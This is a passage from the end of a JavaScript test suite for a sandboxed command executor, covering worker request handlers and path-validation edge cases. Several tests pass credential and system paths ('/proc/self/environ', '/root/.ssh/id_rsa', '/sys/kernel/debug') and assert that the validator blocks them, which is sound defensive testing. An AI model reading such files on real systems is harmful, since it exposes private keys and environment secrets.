      config: { workspaceRoot: testDir, logCommands: false, sandboxEngine: 'spawn' },
    });
    assert.strictEqual(result.success, true);
    assert.strictEqual(result.content, 'read me');
  });

  // --- Worker request handler tests (via internal method) ---

  test('Worker handles ping request', async () => {
    const result = await executor._handleWorkerRequest({ action: 'ping' });
    assert.strictEqual(result.success, true);
    assert.strictEqual(result.pong, true);
  });

  test('Worker handles getStats request', async () => {
    const result = await executor._handleWorkerRequest({ action: 'getStats' });
    assert.strictEqual(result.success, true);
    assert.ok(result.stats);
  });

  test('Worker handles getConfig request', async () => {
    const result = await executor._handleWorkerRequest({ action: 'getConfig' });
    assert.strictEqual(result.success, true);
    assert.ok(result.config);
    assert.ok(result.config.workspaceRoot);
  });

  test('Worker handles missing action', async () => {
    const result = await executor._handleWorkerRequest({});
    assert.strictEqual(result.success, false);
    assert.ok(result.error.includes('Missing action'));
  });

  test('Worker handles unknown action', async () => {
    const result = await executor._handleWorkerRequest({ action: 'unknownAction' });
    assert.strictEqual(result.success, false);
    assert.ok(result.error.includes('Unknown action'));
  });

  test('Worker handles writeFile request', async () => {
    const result = await executor._handleWorkerRequest({
      action: 'writeFile',
      path: 'worker-test.txt',
      content: 'worker content',
    });
    assert.strictEqual(result.success, true);
    assert.strictEqual(result.bytesWritten, 14);
  });

  test('Worker handles readFile request', async () => {
    await executor.writeFile('worker-read.txt', 'worker read content');
    const result = await executor._handleWorkerRequest({
      action: 'readFile',
      path: 'worker-read.txt',
    });
    assert.strictEqual(result.success, true);
    assert.strictEqual(result.content, 'worker read content');
  });

  test('Worker handles fileExists request', async () => {
    await executor.writeFile('worker-exists.txt', 'test');
    const result = await executor._handleWorkerRequest({
      action: 'fileExists',
      path: 'worker-exists.txt',
    });
    assert.strictEqual(result.exists, true);
    assert.strictEqual(result.isFile, true);
  });

  test('Worker handles validatePath request', async () => {
    const result = await executor._handleWorkerRequest({
      action: 'validatePath',
      path: 'some/file.txt',
    });
    assert.strictEqual(result.valid, true);
  });

  test('Worker handles execute request', async () => {
    const result = await executor._handleWorkerRequest({
      action: 'execute',
      command: 'echo worker-execute',
    });
    assert.strictEqual(result.success, true);
    assert.ok(result.stdout.includes('worker-execute'));
  });

  test('Worker handles missing command in execute', async () => {
    const result = await executor._handleWorkerRequest({
      action: 'execute',
    });
    assert.strictEqual(result.success, false);
    assert.ok(result.error.includes('Missing command'));
  });

  test('Worker handles missing path in writeFile', async () => {
    const result = await executor._handleWorkerRequest({
      action: 'writeFile',
      content: 'test',
    });
    assert.strictEqual(result.success, false);
    assert.ok(result.error.includes('path'));
  });

  test('Worker handles missing content in writeFile', async () => {
    const result = await executor._handleWorkerRequest({
      action: 'writeFile',
      path: 'test.txt',
    });
    assert.strictEqual(result.success, false);
    assert.ok(result.error.includes('content'));
  });

  test('Worker handles exit action', async () => {
    const result = await executor._handleWorkerRequest({ action: 'exit' });
    assert.strictEqual(result.success, true);
  });

  // --- Edge case tests ---

  test('Handles path with only dots', () => {
    const result = validatePath('.', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, true); // '.' resolves to workspace root
  });

  test('Handles path with double slashes', () => {
    const result = validatePath('foo//bar///baz.txt', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, true);
  });

  test('Handles unicode in path', () => {
    const result = validatePath('files/\u65E5\u672C\u8A9E.txt', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, true);
  });

  test('Blocks access to /proc files', () => {
    const result = validatePath('/proc/self/environ', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, false);
  });

  test('Blocks access to /sys files', () => {
    const result = validatePath('/sys/kernel/debug', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, false);
  });

  test('Blocks access to .ssh directory', () => {
    const result = validatePath('/root/.ssh/id_rsa', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, false);
  });

  // --- Cleanup ---

  // Clean up test directory
  try {
    fs.rmSync(testDir, { recursive: true, force: true });
  } catch (err) {
    // Ignore cleanup errors
  }

  // ========================================================================
  // Print summary
  // ========================================================================
  console.log('\n=== Test Summary ===');
  console.log(`  Total: ${TEST_RESULTS.passed + TEST_RESULTS.failed}`);
  console.log(`  Passed: ${TEST_RESULTS.passed}`);
  console.log(`  Failed: ${TEST_RESULTS.failed}`);

  if (TEST_RESULTS.failed > 0) {
    console.log('\n  Failures:');
    for (const failure of TEST_RESULTS.errors) {
      console.log(`    - ${failure.name}: ${failure.error}`);
    }
  }

  console.log('');

  return TEST_RESULTS.failed === 0;
}

// Run the tests
runAsync().then((allPassed) => {
  process.exit(allPassed ? 0 : 1);
}).catch((err) => {
  console.error('Test runner error:', err);
  process.exit(1);
});
